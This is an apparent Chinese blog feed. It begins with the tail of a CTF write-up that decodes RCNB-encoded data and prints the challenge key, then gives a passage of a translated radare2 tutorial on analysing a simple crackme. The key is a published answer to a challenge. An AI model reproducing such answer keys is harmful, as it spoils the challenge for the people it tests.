console.log(res)}printRes(&quot;ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc&quot;);</code></pre><pre><code class="python">#!/usr/bin/env pythonf = open(&#39;plain_array.txt&#39;, &#39;rb&#39;)t = f.read()f.close()data = t.split(&#39;\n&#39;)[:-1]print len(data)# print dataf = open(&#39;trial.7z&#39;, &#39;wb&#39;)for i in range(len(data)):    f.write(chr(int(data[i])))f.close()</code></pre><p>解压后拿到一个新文件 <code>nb</code>，还是被加密了的：</p><pre><code>ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁřȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ</code></pre><p>然后一层层解密拿到 key：</p><pre><code class="md">Well done! It seems that you have great programming skills.ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸßŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ</code></pre><pre><code class="md">Well done! It seems that you have great programming skills.Wishing you happiness during the holidays and throughout the New Year!- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js);) Oh, and here&#39;s the key: N0w_y0u_are_NB_A5_RC</code></pre><h1 id="感谢的话"><a href="#感谢的话" class="headerlink" title="感谢的话"></a>感谢的话</h1><p>最后感谢吾爱破解大佬们的辛勤付出！</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://github.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://github.com/Coxxs/RCNB.js</a><br><a href="https://travis-ci.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://travis-ci.com/Coxxs/RCNB.js</a><br><a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">https://liudanking.com/golang/utf-8_replacement_character/</a><br><a href="https://www.52pojie.cn/thread-873265-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-873265-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【译】Radare2之旅-Part1：Simple crackme</title>
    <link href="/2019/02/18/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part1%EF%BC%9ASimple-crackme/"/>
    <url>/2019/02/18/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part1%EF%BC%9ASimple-crackme/</url>
    
    <content type="html"><![CDATA[<p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">Megabeets</a>。</p><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>过去一年里的 CTF 比赛中，不论是逆向工程（RE）还是漏洞挖掘（PWN），我一直在用<code>radare2</code>。我发现<code>radare2</code>对于很多 CTF 的题目来说都很有用，极大地缩短了我的做题时间。遗憾的是熟悉 radare2 的人太少了。可能大家都习惯了使用<code>IDA Pro</code>、<code>OllyDBG</code>还有<code>gdb</code>，或者没有听说过它。不管怎么样，我都认为<code>radare2</code>应该成为你工具箱中的一部分。</p><p>因为我真的特别喜欢这个项目，而且我希望能有越来越多的人开始熟悉它、使用它，能对项目做出一些贡献。我计划写一系列的文章以及使用<code>r2</code>的例子。因为那些文章都涉及<code>radare2</code>的特点和功能，我会解释的更加详细。</p><p><img src="https://www.megabeets.net/uploads/r2_part1_1.png" srcset="/img/loading.gif" alt="Welcome to IDA 10.0. （在 radare2/doc/fortunes.fun 查看更多）"></p><h1 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a><code>radare2</code></h1><p><code>radare2</code>是一个逆向工程和二进制分析的开源框架，它有很多命令行接口，包括反汇编、分析数据、打补丁、比较数据、查找、替换、可视化等等功能。同时它可以在几乎所有的主要操作系统（<code>GNU/Linux</code>、<code>.Windows</code>、<code>*BSD</code>、<code>iOS</code>、<code>OSX</code>、<code>Solaris</code>等等）上运行，并且支持许多 CPU 架构和文件格式。他所有的特点可以展现出一个思想——<code>radare2</code>是绝对自由的。</p><p>该框架是一个工具的集合，既可以在<code>r2</code>给出的 shell 下使用，又可以独立使用——比如我们将要了解的<code>rahash2</code>、<code>rabin2</code>、<code>ragg2</code>三个组件。所有的组件赋予了<code>radare2</code>强大的静态或动态分析、十六进制编辑以及漏洞挖掘能力（在接下来的文章中我会更深入地讲述）。</p><p>我们必须意识到学习<code>r2</code>是一个十分艰难的过程——虽然<code>r2</code>有 GUI 和 WebUI。在我看来，IDA 的 GUI 和方便性确实更佳。但是它的命令行接口，包括其可视化模式，仍然是<code>radare2</code>的核心以及魅力所在。因为它的复杂性，我会尽力讲得浅显易懂。</p><p><img src="https://www.megabeets.net/uploads/r2_learning_curve.png" srcset="/img/loading.gif" alt="这差不多是r2的学习曲线"></p><p>在开始之前，你可以看一看<a href="https://www.radare.org/r/cmp.html" target="_blank" rel="noopener">“r2、IDA Pro 和 Hopper 等工具间的比较”</a>来了解它。</p><h1 id="获取radare2"><a href="#获取radare2" class="headerlink" title="获取radare2"></a>获取<code>radare2</code></h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><code>radare2</code>的环境配置非常快——我们每天都会更新，所以更推荐你去使用 git 的版本，而不是稳定版本。有时候稳定版本可能没有 git 版本更稳定。</p><pre><code class="shell">$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh</code></pre><p>如果你不想下载 git 版本或者你想要不同操作系统（<code>Windows</code>、<code>OS X</code>、<code>iOS</code>等等）上的可执行文件，可以在<a href="https://www.radare.org/r/down.html" target="_blank" rel="noopener">radare2 官网下载界面</a>查看。</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>正如我之前所说的，更推荐大家使用 git 仓库里最新版的<code>r2</code>。从 git 更新<code>r2</code>只需要执行：</p><pre><code class="shell">$ ./sys/install.sh</code></pre><p>然后你就能从 git 获得最新的版本。我通常每天早上会更新一下<code>radare2</code>，在这期间可以看看一会儿视频消遣。</p><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>我实在想不出什么理由会让你在看这篇文章时想要卸载<code>radare2</code>。如果要卸载的话只需要执行：</p><pre><code class="shell">$ make uninstall$ make purge</code></pre><h1 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h1><p>你可以在<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1" target="_blank" rel="noopener">这里</a>下载 Crackme。</p><p>现在你已经在自己的系统上下载了<code>radare2</code>和文件，我们可以开始探索<code>radare2</code>的基础使用。我会在<a href="https://remnux.org/" target="_blank" rel="noopener">REMunx</a>上调试，大部分的命令和说明跟<code>Windows</code>或者其他系统上是一样的。</p><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>和大部分命令行工具一样，查看可选参数的方式是执行<code>-h</code>参数：</p><pre><code class="shell">$ r2 -h</code></pre><p>我不把完整的输出放上来，而是放一些我日常工作中常用的参数：</p><pre><code class="shell">Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]          [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=-d: Debug the executable &#39;file&#39; or running process &#39;pid&#39;-A: Analyze executable at load time (xrefs, etc)-q: Quiet mode, exit after processing commands-w: Write mode enabled-L: List of supported IO plugins-i [file]: Interprets a r2 script-n: Bare load. Do not load executable info as the entrypoint-c &#39;command; command; ...&#39;: Run r2 and execute commands (eg: r2 &#39;s main; px 60&#39;)-p [prj]: Creates a project for the file being analyzed-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with</code></pre><h2 id="二进制信息"><a href="#二进制信息" class="headerlink" title="二进制信息"></a>二进制信息</h2><p>面对一个新的文件时，我第一件想做的事就是获取文件的信息。我们可以使用<code>r2</code>框架中最强大的工具之一——<code>rabin2</code>来获取信息。</p><blockquote><ul><li><p><code>rabin2</code>可以从二进制文件中获取信息，包括区段、文件头、导入导出表、字符串、入口点等等。同时具有不同的格式的输出。<code>rabin2</code>支持<code>ELF</code>、<code>PE</code>、<code>Mach-O</code>、<code>Java CLASS</code>等文件。</p></li><li><p>使用<code>man rabin2</code>查看更多的信息。</p></li></ul></blockquote><p>我们执行<code>rabin2</code>并使用参数<code>-I</code>输出二进制信息，例如操作系统、语言、字节序、框架以及保护技术（比如<code>Canary</code>、<code>PIC</code>、<code>NX</code>）等等。</p><pre><code class="shell">$ rabin2 -I megabeets_0x1havecode truepic      falsecanary   falsenx       falsecrypto   falseva       trueintrp    /lib/ld-linux.so.2bintype  elfclass    ELF32lang     carch     x86bits     32machine  Intel 80386os       linuxminopsz  1maxopsz  16pcalign  0subsys   linuxendian   littlestripped falsestatic   falselinenum  truelsyms    truerelocs   truerpath    NONEbinsz    6220</code></pre><p>你可以清楚地看到，这是一个 32 位 elf 文件，没有符号表并且是动态链接。它没有任何漏洞利用技术——下一篇文章我们讲学习使用<code>radare2</code>来对漏洞进行利用。<br>让我们跑一下程序，看看它做了什么。</p><blockquote><ul><li>注意：虽然我可以向你保证这个程序是安全的，但是逆向一个未知的程序时，务必在一个虚拟环境下运行。</li><li>不过你可以相信我，因为程序确实是安全的。😛</li></ul></blockquote><pre><code class="shell">$ ./megabeets_0x1  .:: Megabeets ::.Think you can make it?Nop, Wrong argument.$ ./megabeets_0x1 abcdef  .:: Megabeets ::.Think you can make it?Nop, Wrong argument.</code></pre><p>第一次跑的时候，输出了<code>Nop, Wrong argument</code>。假设我们需要提供一个参数，第二次输入<code>abcdef</code>作为参数，依旧失败了。显然需要特定的字符串才能绕过。</p><p>让我们用<code>radare2</code>来测试程序：</p><pre><code class="shell">$ r2 ./megabeets_0x1 — Thank you for using radare2. Have a nice night![0x08048370]&gt;</code></pre><p>我们生成了一个<code>radare2</code>的 shell，还有一个欢迎界面。我们可以执行<code>fo</code>来输出一个新的句子，有些很搞笑同时有些也很有趣。现在<code>r2</code>的 shell 正在等着我们输入命令，并且展示给我们此刻所在的地址（0x08048370）。默认情况下我们自动在入口点处。让我们看看是否正确：</p><pre><code class="shell">[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints</code></pre><p>我们使用<code>ie</code>命令输出了文件的入口点地址。<code>r2</code>命令有一系列有意义的字母。在这个例子里，<code>ie</code>代表了<code>info &gt;&gt; entrypoint</code>。因此在你熟悉了<code>radare2</code>的能力之后，命令都是比较好记的。但是你不需要记住所有的命令——你可以仅仅需要在（几乎）每个字母后面加上<code>?</code>来获得命令的信息以及它的子命令。</p><pre><code class="shell">[0x08048370]&gt; i?|Usage: i Get info from opened file (see rabin2’s manpage)| Output mode:| ‘*’                Output in radare commands| ‘j’                Output in json| ‘q’                Simple quiet output| Actions:| i|ij               Show info of current file (in JSON)| iA                 List archs| ia                 Show all info (imports, exports, sections..)| ib                 Reload the current buffer for setting of the bin (use once only)| ic                 List classes, methods and fields| iC                 Show signature info (entitlements, …)| id                 Debug information (source lines)| iD lang sym        demangle symbolname for given language| ie                 Entrypoint| iE                 Exports (global symbols)| ih                 Headers (alias for iH)| iHH                Verbose Headers in raw text| ii                 Imports| iI                 Binary info| ik [query]         Key-value database from RBinObject| il                 Libraries| iL                 List all RBin plugins loaded| im                 Show info about predefined memory allocation| iM                 Show main address| io [file]          Load info from file (or last opened) use bin.baddr| ir|iR              Relocs| is                 Symbols| iS [entropy,sha1]  Sections (choose which hash algorithm to use)| iV                 Display file version info| iz                 Strings in data sections| izz                Search for Strings in the whole binary| iZ                 Guess size of binary program</code></pre><p><code>i</code>命令目的是从打开的文件中获取信息，它就是集成到<code>radare2</code>的 shell 里的<code>rabin2</code>（之前提到的）。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>默认情况下<code>radare2</code>不会自动分析文件，因为分析文件是一个复杂的过程，尤其是比较大的文件。了解更多关于分析的内容，你可以看一看在<code>radare2</code>博客上的<a href="http://radare.today/posts/analysis-by-default/" target="_blank" rel="noopener">这篇文章</a>。</p><p>显然分析仍然是可能的，<code>r2</code>提供了许多种类的分析方式。正如我之前提到的，我们可以通过对<code>a</code>命令后面添加<code>?</code>来查找分析选项。</p><pre><code class="shell">[0x08048370]&gt; a?|Usage: a[abdefFghoprxstc] […]| ab [hexpairs]    analyze bytes| abb [len]        analyze N basic blocks in [len] (section.size by default)| aa[?]            analyze all (fcns + bbs) (aa0 to avoid sub renaming)| ac[?] [cycles]   analyze which op could be executed in [cycles]| ad[?]            analyze data trampoline (wip)| ad [from] [to]   analyze data pointers to (from-to)| ae[?] [expr]     analyze opcode eval expression (see ao)| af[?]            analyze Functions| aF               same as above, but using anal.depth=1| ag[?] [options]  output Graphviz code| ah[?]            analysis hints (force opcode size, …)| ai [addr]        address information (show perms, stack, heap, …)| ao[?] [len]      analyze Opcodes (or emulate it)| aO               Analyze N instructions in M bytes| ar[?]            like ‘dr’ but for the esil vm. (registers)| ap               find prelude for current offset| ax[?]            manage refs/xrefs (see also afx?)| as[?] [num]      analyze syscall using dbg.reg| at[?] [.]        analyze execution tracesExamples:f ts @ S*~text:0[3]; f t @ section..textf ds @ S*~data:0[3]; f d @ section..data.ad t t+ts @ d:ds</code></pre><p>我通常开始分析时会执行<code>aa</code>（<code>analyse all</code>）。这个名称有一点容易误解，因为除此之外还有很多可以分析的（执行<code>aa?</code>可以看到更多的用法），但对于这个程序来说已经足够了。这次我们直接执行<code>aaa</code>，更简单些。你也可以执行<code>radare2</code>用<code>-A</code>参数来分析文件，直接在开始就执行<code>aaa</code>（例如<code>r2 -A megabeets_0x1</code>）</p><pre><code class="shell">[0x08048370]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</code></pre><h2 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h2><p>在分析之后，<code>radare2</code>把一些特定的名字和偏移联系在一起，例如区段、函数、符号表、字符串等等。他们被称作为标志。标志被整合进标志空间，一个标志空间是所有类似特征的标志的集合。执行<code>fs</code>以查看所有的标志：</p><pre><code class="shell">[0x08048370]&gt; fs0    4 . strings1   35 . symbols2   82 . sections3    5 . relocs4    5 . imports5    1 . functions</code></pre><p>我们可以使用<code>fs &lt;flagspace&gt;</code>来查看某个特定的标志空间，然后用<code>f</code>输出所有的标志。我们使用分号将一行中的多个命令分开（比如<code>命令一; 命令二; 命令三;...</code>）。</p><pre><code class="shell">[0x08048370]&gt; fs imports; f0x08048320 6 sym.imp.strcmp0x08048330 6 sym.imp.strcpy0x08048340 6 sym.imp.puts0xffffffff 16 loc.imp.__gmon_start__0x08048350 6 sym.imp.__libc_start_main</code></pre><p>正如我们所看到的，<code>radare2</code>将所有程序所使用的导入表输出——可以看到我们所熟悉的<code>strcmp</code>、<code>strcpy</code>、<code>puts</code>等，包括相关的地址。我们也可以列出字符串的标志空间。</p><pre><code class="shell">[0x08048370]&gt; fs strings; f0x08048700 21 